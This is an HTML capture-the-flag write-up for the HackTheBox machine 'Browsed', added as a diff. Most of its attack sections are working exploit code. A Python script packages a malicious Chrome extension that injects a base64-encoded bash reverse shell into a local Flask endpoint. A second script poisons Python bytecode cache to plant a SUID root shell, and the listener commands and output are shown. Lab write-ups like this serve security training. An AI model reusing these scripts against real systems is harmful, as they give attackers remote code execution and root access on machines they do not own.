@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Browsed — HTB Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+  :root { --bg:#141d2b; --bg2:#1a2332; --bg3:#0f1620; --green:#9fef00; --red:#ff3e3e; --orange:#ffaf00; --blue:#2ea8e5; --purple:#a44eff; --text:#a4b1cd; --text-bright:#ffffff; --border:#2a3a52; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Rajdhani',sans-serif; font-size:16px; line-height:1.7; min-height:100vh; }
+  body::before { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px); pointer-events:none; z-index:1000; }
+  header { background:var(--bg3); border-bottom:1px solid var(--border); padding:0 2rem; display:flex; align-items:center; justify-content:space-between; height:60px; position:sticky; top:0; z-index:100; }
+  .logo { font-family:'Share Tech Mono',monospace; color:var(--green); font-size:1.2rem; letter-spacing:2px; text-decoration:none; }
+  .logo span { color:var(--text); }
+  .header-right { display:flex; gap:0.5rem; align-items:center; }
+  .badge { padding:2px 10px; border-radius:3px; font-size:0.75rem; font-weight:700; letter-spacing:1px; text-transform:uppercase; font-family:'Share Tech Mono',monospace; }
+  .badge-medium { background:var(--orange); color:#000; }
+  .badge-linux { background:var(--bg2); border:1px solid var(--border); color:var(--text); }
+  .container { max-width:1000px; margin:0 auto; padding:3rem 2rem; }
+  .hero { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:2.5rem; margin-bottom:2.5rem; position:relative; overflow:hidden; }
+  .hero::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--green),var(--blue),var(--purple)); }
+  .machine-name { font-family:'Share Tech Mono',monospace; font-size:2.8rem; color:var(--text-bright); letter-spacing:3px; line-height:1; }
+  .machine-name span { color:var(--green); }
+  .badges { display:flex; gap:0.5rem; flex-wrap:wrap; margin-top:0.8rem; }
+  .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:1rem; margin-top:1.5rem; }
+  .stat { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:0.8rem 1rem; }
+  .stat-label { font-size:0.7rem; text-transform:uppercase; letter-spacing:2px; color:var(--text); margin-bottom:0.3rem; font-family:'Share Tech Mono',monospace; }
+  .stat-value { font-size:1rem; color:var(--text-bright); font-family:'Share Tech Mono',monospace; }
+  .stat-value.green { color:var(--green); } .stat-value.blue { color:var(--blue); }
+  .chain { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1.5rem 2rem; margin-bottom:2.5rem; font-family:'Share Tech Mono',monospace; font-size:0.85rem; line-height:2; }
+  .chain-title { color:var(--green); font-size:0.75rem; letter-spacing:3px; text-transform:uppercase; margin-bottom:1rem; }
+  .chain-step .arrow { color:var(--green); } .chain-step .user { color:var(--orange); font-weight:700; }
+  .section { background:var(--bg2); border:1px solid var(--border); border-radius:8px; margin-bottom:1.5rem; overflow:hidden; }
+  .section-header { background:var(--bg3); border-bottom:1px solid var(--border); padding:1rem 1.5rem; display:flex; align-items:center; gap:1rem; }
+  .section-num { width:28px; height:28px; background:var(--green); color:#000; border-radius:4px; display:flex; align-items:center; justify-content:center; font-family:'Share Tech Mono',monospace; font-size:0.85rem; font-weight:700; flex-shrink:0; }
+  .section-title { font-size:1.1rem; font-weight:700; color:var(--text-bright); text-transform:uppercase; letter-spacing:1px; }
+  .section-body { padding:1.5rem; }
+  p { margin-bottom:1rem; color:var(--text); font-size:1rem; }
+  pre { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:1.2rem 1.5rem; overflow-x:auto; margin:1rem 0; position:relative; }
+  pre::before { content:attr(data-label); position:absolute; top:0.5rem; right:0.8rem; font-family:'Share Tech Mono',monospace; font-size:0.65rem; color:var(--text); opacity:0.5; text-transform:uppercase; letter-spacing:1px; }
+  code { font-family:'JetBrains Mono',monospace; font-size:0.82rem; line-height:1.8; color:var(--text-bright); }
+  .c-green { color:var(--green); } .c-orange { color:var(--orange); } .c-blue { color:var(--blue); } .c-dim { color:#546e8a; }
+  .ic { font-family:'JetBrains Mono',monospace; font-size:0.82rem; background:var(--bg3); border:1px solid var(--border); padding:1px 6px; border-radius:3px; color:var(--green); }
+  .success-box { border-left:3px solid var(--green); background:rgba(159,239,0,0.07); padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; color:var(--green); font-family:'Share Tech Mono',monospace; font-size:0.85rem; }
+  .info-box { border-left:3px solid var(--blue); background:rgba(46,168,229,0.07); padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; font-size:0.9rem; }
+  h3 { color:var(--text-bright); font-size:1rem; font-weight:700; text-transform:uppercase; letter-spacing:1px; margin:1.5rem 0 0.8rem; padding-bottom:0.4rem; border-bottom:1px solid var(--border); }
+  h3:first-child { margin-top:0; }
+  .cred{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--orange);cursor:pointer;border:1px dashed rgba(255,175,0,.5);padding:1px 8px;border-radius:3px;background:rgba(255,175,0,.06);user-select:none;}
+  #troll-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;}
+  .troll-inner{background:#1e2b3d;border:1px solid var(--green);border-radius:8px;padding:2.5rem;max-width:420px;width:90%;text-align:center;font-family:'Rajdhani',sans-serif;position:relative;overflow:hidden;}
+  .troll-inner::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--blue));}
+  .troll-icon{font-size:3rem;margin-bottom:.5rem;}
+  .troll-title{color:#fff;font-size:1.4rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:1rem;}
+  .troll-body{color:var(--text);font-size:.95rem;line-height:1.7;margin-bottom:1.5rem;}
+  .troll-btn{padding:.6rem 2rem;background:var(--green);border:none;color:#000;border-radius:4px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:.85rem;font-weight:700;}
+  footer { text-align:center; padding:2rem; color:var(--text); font-family:'Share Tech Mono',monospace; font-size:0.75rem; border-top:1px solid var(--border); opacity:0.5; }
+</style>
+</head>
+<body>
+<header>
+  <a href="../" class="logo">SKID<span>::</span>TUTS</a>
+  <div class="header-right"><span class="badge badge-medium">Medium</span><span class="badge badge-linux">Linux</span></div>
+</header>
+<div class="container">
+  <div class="hero">
+    <div class="machine-name">BROWS<span>ED</span></div>
+    <div class="badges"><span class="badge badge-medium">Medium</span><span class="badge badge-linux">Linux</span></div>
+    <div class="stats-grid">
+      <div class="stat"><div class="stat-label">Target IP</div><div class="stat-value blue">10.129.244.79</div></div>
+      <div class="stat"><div class="stat-label">OS</div><div class="stat-value">Ubuntu Linux</div></div>
+      <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">22, 80</div></div>
+      <div class="stat"><div class="stat-label">User Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
+      <div class="stat"><div class="stat-label">Root Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
+    </div>
+  </div>
+  <div class="chain">
+    <div class="chain-title">// Attack Chain</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Chrome extension upload &#8594; Flask /routines/ command injection</div>
+    <div class="chain-step"><span class="user">larry</span> <span class="arrow">&#8594;</span> sudo extension_tool.py &#8594; .pyc cache poisoning &#8594; SUID bash</div>
+    <div class="chain-step"><span class="user">root</span> <span class="arrow">&#8594;</span> <span class="c-green">pwned &#10003;</span></div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">1</div><div class="section-title">Reconnaissance</div></div>
+    <div class="section-body">
+      <pre data-label="bash"><code><span class="c-green">$</span> nmap -p- -A -T4 -v 10.129.244.79</code></pre>
+      <pre data-label="output"><code>22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu
+80/tcp  open  http  nginx 1.24.0 -- browsed.htb</code></pre>
+      <p>The web app at <span class="ic">http://browsed.htb</span> is a Chrome extension sharing platform. A developer reviews and runs uploaded extensions server-side, meaning background.js executes with access to localhost services including a Flask service on port 5000.</p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">2</div><div class="section-title">Malicious Chrome Extension</div></div>
+    <div class="section-body">
+      <p>An internal Flask service on port 5000 exposes a <span class="ic">/routines/</span> endpoint that passes the route parameter directly into a shell command. A URL like <span class="ic">http://127.0.0.1:5000/routines/a[$(COMMAND)]</span> executes arbitrary commands.</p>
+      <pre data-label="create_ext.py"><code><span class="c-blue">import</span> zipfile, io, base64
+
+my_ip = <span class="c-orange">'10.10.X.X'</span>
+raw_shell = <span class="c-orange">f'bash -i &gt;&amp; /dev/tcp/{my_ip}/9001 0&gt;&amp;1'</span>
+b64 = base64.b64encode(raw_shell.encode()).decode()
+payload = <span class="c-orange">f'echo${{IFS}}{b64}|base64${{IFS}}-d|bash'</span>
+
+manifest = <span class="c-orange">'{"manifest_version":3,"name":"Optimizer","version":"1.1","background":{"service_worker":"background.js"},"host_permissions":["*://127.0.0.1/*"]}'</span>
+background = <span class="c-orange">f'fetch(`http://127.0.0.1:5000/routines/a[$({payload})]`,{{mode:"no-cors"}});'</span>
+
+buf = io.BytesIO()
+<span class="c-blue">with</span> zipfile.ZipFile(buf, <span class="c-orange">'w'</span>) <span class="c-blue">as</span> z:
+    z.writestr(<span class="c-orange">'manifest.json'</span>, manifest)
+    z.writestr(<span class="c-orange">'background.js'</span>, background)
+open(<span class="c-orange">'shell_exploit.zip'</span>, <span class="c-orange">'wb'</span>).write(buf.getvalue())</code></pre>
+      <pre data-label="bash"><code><span class="c-green">$</span> python3 create_ext.py
+<span class="c-green">$</span> penelope -p 9001
+<span class="c-dim"># Upload shell_exploit.zip at http://browsed.htb/upload.php</span></code></pre>
+      <div class="success-box">[+] Got reverse shell from browsed~10.129.244.79<br>larry@browsed:~/markdownPreview$ cat ~/user.txt</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">3</div><div class="section-title">Privilege Escalation — .pyc Cache Poisoning</div></div>
+    <div class="section-body">
+      <pre data-label="bash"><code>larry@browsed:~$ sudo -l
+<span class="c-green">(root) NOPASSWD: /opt/extensiontool/extension_tool.py</span></code></pre>
+      <p>The tool imports <span class="ic">extension_utils.py</span>. Python validates bytecode cache only by file size and mtime — not content — so we can inject malicious bytecode that matches the original file's metadata.</p>
+      <pre data-label="exploit.py"><code><span class="c-blue">import</span> os, py_compile, shutil
+
+ORIG = <span class="c-orange">'/opt/extensiontool/extension_utils.py'</span>
+TARGET_PYC = <span class="c-orange">'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'</span>
+stat = os.stat(ORIG)
+
+payload  = <span class="c-orange">'import os\n'</span>
+payload += <span class="c-orange">'def validate_manifest(p): os.system("cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash"); return {}\n'</span>
+payload += <span class="c-orange">'def clean_temp_files(a): pass\n'</span>
+payload += <span class="c-orange">'#'</span> * (stat.st_size - len(payload))
+
+open(<span class="c-orange">'/tmp/evil.py'</span>, <span class="c-orange">'w'</span>).write(payload)
+os.utime(<span class="c-orange">'/tmp/evil.py'</span>, (stat.st_atime, stat.st_mtime))
+py_compile.compile(<span class="c-orange">'/tmp/evil.py'</span>, cfile=<span class="c-orange">'/tmp/evil.pyc'</span>)
+os.remove(TARGET_PYC)
+shutil.copy(<span class="c-orange">'/tmp/evil.pyc'</span>, TARGET_PYC)
+print(<span class="c-orange">'[+] Done'</span>)</code></pre>
+      <pre data-label="bash"><code>larry@browsed:~$ python3.12 /tmp/exploit.py
+larry@browsed:~$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
+larry@browsed:~$ /tmp/rootbash -p</code></pre>
+      <div class="success-box">rootbash-5.2# cat /root/root.txt</div>
+    </div>
+  </div>
+</div>
+
+<div id="troll-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;">
+  <div class="troll-inner">
+    <div class="troll-icon">&#128064;</div>
+    <div class="troll-title">Really?</div>
+    <div class="troll-body">
+      The credentials are <strong style="color:var(--green)">inside the box</strong> &mdash; not in a writeup.<br><br>
+      Go find them yourself. That's literally the point. &#128526;
+    </div>
+    <button class="troll-btn" onclick="document.getElementById('troll-modal').style.display='none'">Fine. I'll do it myself.</button>
+  </div>
+</div>
+<script>function showTroll(){document.getElementById('troll-modal').style.display='flex';}</script>
+
+<footer>HackTheBox &middot; Browsed &middot; Medium &middot; Linux</footer>
+</body>
+</html>
